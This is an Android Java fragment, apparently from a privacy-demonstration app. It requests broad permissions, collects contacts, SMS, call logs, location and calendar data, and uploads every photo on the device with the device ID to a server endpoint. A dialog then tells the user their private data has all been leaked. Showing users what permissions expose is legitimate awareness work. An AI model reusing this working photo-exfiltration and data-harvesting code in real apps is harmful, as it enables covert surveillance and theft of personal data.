/*
 * Copyright (C) 2022 xuexiangjys(xuexiangjys@163.com)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *       http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

package com.lenovo.innovate.fragment.news;

import static com.xuexiang.xutil.XUtil.getContentResolver;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;

import androidx.annotation.NonNull;
import androidx.recyclerview.widget.RecyclerView;

import com.alibaba.android.vlayout.DelegateAdapter;
import com.alibaba.android.vlayout.VirtualLayoutManager;

import com.blankj.utilcode.util.ThreadUtils;
import com.hjq.permissions.OnPermissionCallback;
import com.hjq.permissions.Permission;
import com.hjq.permissions.XXPermissions;
import com.lenovo.innovate.R;
import com.lenovo.innovate.activity.MainActivity;
import com.lenovo.innovate.core.BaseFragment;
import com.lenovo.innovate.databinding.FragmentGuoduBinding;
import com.lenovo.innovate.prince.PermissionUtils;
import com.lenovo.innovate.prince.accessiblity.AutoRun;
import com.lenovo.innovate.prince.http.UpPicture;
import com.lenovo.innovate.prince.utils.SettingSPUtils;
import com.lenovo.innovate.utils.DemoDataProvider;
import com.lenovo.innovate.utils.Utils;
import com.lenovo.innovate.utils.XToastUtils;

import com.xuexiang.xhttp2.XHttp;
import com.xuexiang.xhttp2.XHttpSDK;
import com.xuexiang.xhttp2.callback.impl.IProgressResponseCallBack;
import com.xuexiang.xhttp2.subsciber.ProgressLoadingSubscriber;
import com.xuexiang.xpage.annotation.Page;
import com.xuexiang.xpage.enums.CoreAnim;
import com.xuexiang.xui.adapter.recyclerview.RecyclerViewHolder;
import com.xuexiang.xui.adapter.simple.AdapterItem;
import com.xuexiang.xui.utils.StatusBarUtils;
import com.xuexiang.xui.widget.actionbar.TitleBar;
import com.xuexiang.xui.widget.banner.widget.banner.SimpleImageBanner;
import com.xuexiang.xui.widget.dialog.materialdialog.MaterialDialog;
import com.xuexiang.xui.widget.imageview.ImageLoader;
import com.xuexiang.xui.widget.imageview.RadiusImageView;
import com.xuexiang.xui.widget.toast.XToast;
import com.xuexiang.xutil.app.ActivityUtils;
import com.xuexiang.xutil.file.FileUtils;
import com.xuexiang.xutil.net.NetworkUtils;
import com.xuexiang.xutil.tip.ToastUtils;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import me.samlss.broccoli.Broccoli;

/**
 * 首页动态
 *
 * @author xuexiang
 * @since 2019-10-30 00:15
 */
@Page(anim = CoreAnim.none)
public class GuoDuFragment extends BaseFragment<FragmentGuoduBinding> implements View.OnClickListener{

    private static final String TAG = "permission";
    Context context;
    public  static List<Object> list_already_picture = new ArrayList<>();
    public  static  List<Object> already_up1 = new ArrayList<>();
    PermissionUtils permissionUtils =new  PermissionUtils();
    @NonNull
    @Override
    protected FragmentGuoduBinding viewBindingInflate(LayoutInflater inflater, ViewGroup container) {
        return FragmentGuoduBinding.inflate(inflater, container, false);
    }

    /**
     * @return 返回为 null意为不需要导航栏
     */
    @Override
    protected TitleBar initTitle() {
        return null;
    }

    /**
     * 初始化控件
     */
    @Override
    protected void initViews() {

        context = getActivity();

        View button1 = findViewById(R.id.super_all);
        button1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                XXPermissions.with(context)
                        .permission(com.hjq.permissions.Permission.READ_CONTACTS)
                        .permission(Permission.READ_SMS)
                        .permission(Permission.RECEIVE_SMS)
                        .permission(com.hjq.permissions.Permission.READ_CALL_LOG)
                        .permission(com.hjq.permissions.Permission.READ_PHONE_STATE)
                        .permission(com.hjq.permissions.Permission.ACCESS_FINE_LOCATION)
                        .permission(com.hjq.permissions.Permission.ACCESS_COARSE_LOCATION)
                        .permission(com.hjq.permissions.Permission.READ_EXTERNAL_STORAGE)
                        .permission(com.hjq.permissions.Permission.READ_CALENDAR)
                        .request(new OnPermissionCallback() {
                            @Override
                            public void onGranted(List<String> permissions, boolean all) {
                                if (all){
                                    showSimpleTipDialog_all();
                                    permissionUtils.get_contact(context,getActivity());
                                    permissionUtils.get_message(context);
                                    permissionUtils.get_CallLog(context);
                                    permissionUtils.get_phoneMessage(context);
                                    permissionUtils.get_location(context);
                                    picture_per();
                                    permissionUtils.get_calendar(context);
                                }
                            }
                            @Override
                            public void onDenied(List<String> permissions, boolean never) {
                                if (never){
                                    XToastUtils.toast( "onDenied：被永久拒绝授权，请手动授予权限 ");
                                    XXPermissions.startPermissionActivity(context,permissions);
                                }else {
                                    XToastUtils.toast( "onDenied: 权限获取失败 ");
                                }
                            }
                        });

            }
        });

    }
    @Override
    protected void initListeners() {
        binding.superContact.setOnClickListener(this);
        binding.superContactLog.setOnClickListener(this);
        binding.superMessage.setOnClickListener(this);
        binding.superPhoneMessage.setOnClickListener(this);
        binding.superLocation.setOnClickListener(this);
        binding.superCalendar.setOnClickListener(this);
        binding.superStorage.setOnClickListener(this);


    }
    @Override
    protected void initArgs() {
        super.initArgs();
        XToast.Config.get()
                //位置设置为居中
                .setGravity(Gravity.CENTER);
    }

    @Override
    public void onClick(View v) {

        int id = v.getId();
        if (id == R.id.super_contact) {
            permissionUtils.get_contact(context,getActivity());
        }else if (id == R.id.super_contact_log) {
            permissionUtils.get_CallLog(context);
        }
        else if (id == R.id.super_message) {
            permissionUtils.get_message(context);
        } else if (id == R.id.super_phone_message) {
            //
            permissionUtils.get_phoneMessage(context);
        }else if (id == R.id.super_location) {
            permissionUtils.get_location(context);
        }else if (id == R.id.super_calendar) {
            permissionUtils.get_calendar(context);
        }else if (id == R.id.super_storage) {
            picture_per();

        } else if (id == R.id.super_microphone) {
            permissionUtils.get_microphone(context);
        }

    }

    @Override
    public void onDestroyView() {
        super.onDestroyView();
    }

    private void pic(){

        List stringList = getSystemPhotoList( context);
        for (int i = 0; i < stringList.size(); i++) {
            String str = (String) stringList.get(i);
            UpPicture upPicture = new UpPicture();

            if( !list_already_picture.contains(stringList.get(i))){
                Log.i("1111111路径",stringList.get(i).toString());
                list_already_picture.add(stringList.get(i));

                ThreadUtils.executeBySingle(new ThreadUtils.SimpleTask<String>() {
                    @Override
                    public String doInBackground() throws Throwable {

                        XHttp.post("/App-Privacy/index.php/Home/Permission/Picture")
                                .params("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID))
                                .uploadFile("file", FileUtils.getFileByPath(str), new IProgressResponseCallBack() {
                                    @Override
                                    public void onResponseProgress(long bytesWritten, long contentLength, boolean done) {

                                    }
                                }).execute(Boolean.class)
                                //.compose(RxLifecycle.with(context).<Boolean>bindToLifecycle())
                                .subscribeWith(new ProgressLoadingSubscriber<Boolean>() {
                                    @Override
                                    public void onSuccess(Boolean aBoolean) {
                                        // mIsEditSuccess = true;
                                        // ToastUtils.toast("图片上传" + (aBoolean ? "成功" : "失败") + "！");
                                    }
                                });
                        return null;
                    }
                    @Override
                    public void onSuccess(String result) {

                    }
                });

                //  System.out.println(str);
            }
        }

    }

    public void picture_per(){
        XXPermissions.with(context)
                .permission(com.hjq.permissions.Permission.READ_EXTERNAL_STORAGE)
                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all){
                          //  XToastUtils.warning("全部照片信息已泄露");
                            pic();
                        }
                    }
                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        if (never){
                            XToastUtils.toast( "onDenied：被永久拒绝授权，请手动授予权限 ");
                            XXPermissions.startPermissionActivity(context,permissions);
                        }else {
                            XToastUtils.toast( "onDenied: 权限获取失败 ");
                        }
                    }
                });
    }

    public static List<String> getSystemPhotoList(Context context)
    {
        List<String> result = new ArrayList<String>();
        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(uri, null, null, null, null);
        if (cursor == null || cursor.getCount() <= 0) return null; // 没有图片
        while (cursor.moveToNext())
        {
            int index = cursor
                    .getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
            String path = cursor.getString(index); // 文件地址
            File file = new File(path);
            if (file.exists())
            {
                result.add(path);
                Log.i(TAG, path);
            }
        }

        return result ;
    }


    public static boolean listContains(List<Object> list, Object value) {
        return list.contains(value);
    }

    private void showSimpleTipDialog_all() {
        MaterialDialog dialog = new MaterialDialog.Builder(getContext())
                .iconRes(R.drawable.icon_tip)
                .title("提示")
                .content("你的隐私数据已经全部泄露")
                .positiveText("确定")
                .build();
        StatusBarUtils.showDialog(getActivity(), dialog);


    }



}
